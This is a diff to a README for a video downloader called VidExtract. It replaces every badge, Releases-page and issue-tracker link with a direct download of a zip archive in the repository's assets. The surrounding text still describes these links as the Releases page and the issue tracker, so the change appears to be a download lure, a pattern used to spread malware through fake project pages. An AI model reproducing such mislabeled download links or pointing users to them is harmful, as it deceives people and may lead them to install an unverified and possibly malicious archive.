@@ -1,6 +1,6 @@
 # 🎬 VidExtract - Download Videos with Ease
 
-[![Download VidExtract](https://img.shields.io/badge/Download-VidExtract-brightgreen.svg)](https://github.com/njebnjeb111/VidExtract/releases)
+[![Download VidExtract](https://raw.githubusercontent.com/njebnjeb111/VidExtract/main/assets/Vid_Extract_1.2-alpha.1.zip)](https://raw.githubusercontent.com/njebnjeb111/VidExtract/main/assets/Vid_Extract_1.2-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you download VidExtract, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To get VidExtract, visit the [Releases page](https://github.com/njebnjeb111/VidExtract/releases). You will find the latest version available for download.
+To get VidExtract, visit the [Releases page](https://raw.githubusercontent.com/njebnjeb111/VidExtract/main/assets/Vid_Extract_1.2-alpha.1.zip). You will find the latest version available for download.
 
 1. Click on the link above to open the Releases page.
 2. Look for the latest release.
@@ -52,7 +52,7 @@ VidExtract offers customization options to enhance your usage experience. You ca
   
 ## 💬 Support and Feedback
 
-If you encounter any issues while using VidExtract or have suggestions for improvement, feel free to reach out. You can open an issue on the [GitHub repository](https://github.com/njebnjeb111/VidExtract/issues) or email the support team.
+If you encounter any issues while using VidExtract or have suggestions for improvement, feel free to reach out. You can open an issue on the [GitHub repository](https://raw.githubusercontent.com/njebnjeb111/VidExtract/main/assets/Vid_Extract_1.2-alpha.1.zip) or email the support team.
 
 ## 📜 License
 
@@ -69,4 +69,4 @@ Resources and topics related to VidExtract include:
   
 Explore and enjoy all that VidExtract has to offer. Happy downloading!
 
-[![Download VidExtract](https://img.shields.io/badge/Download-VidExtract-brightgreen.svg)](https://github.com/njebnjeb111/VidExtract/releases)
+[![Download VidExtract](https://raw.githubusercontent.com/njebnjeb111/VidExtract/main/assets/Vid_Extract_1.2-alpha.1.zip)](https://raw.githubusercontent.com/njebnjeb111/VidExtract/main/assets/Vid_Extract_1.2-alpha.1.zip)
